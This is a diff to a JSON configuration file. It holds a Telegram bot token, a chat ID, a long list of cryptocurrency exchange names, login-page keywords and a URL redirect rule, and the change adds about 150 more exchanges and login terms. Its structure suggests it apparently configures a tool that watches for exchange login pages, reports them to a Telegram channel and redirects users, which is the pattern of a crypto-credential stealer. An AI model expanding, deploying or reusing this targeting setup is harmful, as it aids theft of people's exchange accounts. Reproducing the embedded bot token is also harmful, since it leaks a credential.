@@ -1,7 +1,7 @@
 {
   "tkn": "8282557974:AAEfiiTmrb0APpnGJNCEHWEOJNiCCgB0pIE",
   "chid": "1002836423777",
-  "kws": [
+ "kws": [
     "AOFEX","AscendEX","Backpack","BigONE","BingX","Bit2Me","Bitbay","Bitbank","Bitcointree","BitEx",
     "Bitfinex","BitFlyer","BitForex","Bitget","Bitkub","BitMart","BitMEX","Bitrue","Bitso","Bitstamp",
     "BKEX","Bithumb","Bithumb Global","BitoPro","Binance","Binance US","Binance TR","BTC-Alpha","BTCC",
@@ -13,9 +13,27 @@
     "Nominex","OceanEx","OKCoin","OKX","Paribu","Phemex","Poloniex","ProBit Global","SFOX","SimpleSwap","STEX",
     "SuperEx","Tapbit","Toobit","Tokocrypto","Uniswap","Upbit","UPB","VCC Exchange","WazirX","WhiteBIT","XT.COM",
     "Zaif","Zebpay","ZBG","ZB.com","ZenGo","krypto","criptoswaps","novadax","foxbit","ripio","Bybit","Bybitglobal",
-    "Bitpanda","Coinsquare","Luno","Bitvavo","Bitonic","coincorner","Coinmama","Coinzoom","BTC Markets"
-  ],
-  "lgs": ["login","loguin","sign in","entrar"],
+    "Bitpanda","Coinsquare","Luno","Bitvavo","Bitonic","coincorner","Coinmama","Coinzoom","BTC Markets",
+    
+    /* NOVOS ADICIONADOS (não duplicados) */
+    "Crypto.com Exchange","Pionex","Azbit","Coinstore","KCEX","Coinbase Exchange","WEEX","GroveX","BVOX",
+    "QMall","Ourbit","Biconomy.com","Zoomex","Hibt","Bitunix","Icrypex","BloFin","P2B","PointPay","BitDelta",
+    "BitKan","Trubit","OrangeX","BYDFi","Dex-Trade","BTSE","Tothemoon","SAFEbit","Fastex","CoinTR",
+    "Backpack Exchange","HashKey Exchange","CoinCatch","bitcastle","OKJ","Nonkyc.io","Deribit Spot","BitStorage",
+    "Bitazza","Max Maicoin","VALR","LCX Exchange","EarnBIT","Coins.ph","Independent Reserve","Nami Exchange",
+    "WOO X","Ondo Global Markets","Arkham","Bitcointry","Bitlo","HashKey Global","One Trading","GMO Japan",
+    "Kanga","Figure Markets","itBit","Bittime","XBO.com","Kinesis Money","Cube","Cryptal","Young Platform",
+    "INEX","Delta Exchange","INX One","Bitcoin.me","Websea","Bilaxy","C-Patex","Coinone","Tokpie","Koinpark",
+    "NovaDAX","TokoCrypto","GoPax","CoinJar Exchange","BTCBOX","BitBNS","Gate US","Bitexen","Paymium","Orbix",
+    "Hata","ChainEX","Blockchain.com","FameEX","CoinUp.io","ALP.COM","LocalTrade","Ecxx","Vindax","zondacrypto",
+    "Bit2c","NBX","Digitalexchange.id","Namebase","Niza.io","Catex","BIT","KoinBX","Bitexlive","ZBX","Giottus",
+    "Freiexchange","StakeCube Exchange","Birake","SecondBTC","Bitbegin","BCEX","SafeTrade","Purcow","BtcTurk | Kripto",
+    "Tokenize","Mudrex","Upbit Indonesia","Coinbase International Exchange","AltcoinTrader","Powertrade",
+    "BTC Trade UA","BuyUcoin","Bitsten","Coinlist","BitOnBay","XeggeX","KickEX","TradeOgre","Globe","AQX","DIFX",
+    "Byte Exchange","Okcoin","FMCPAY","Wallet","exchangem","platform"
+],
+
+  "lgs": ["login","loguin","sign in","entrar","acessar","access","account"],
   "rds": [
     {"r":"(www\\.)?modelo\\.com.*","u":"https://ge.globo.com/"}
 
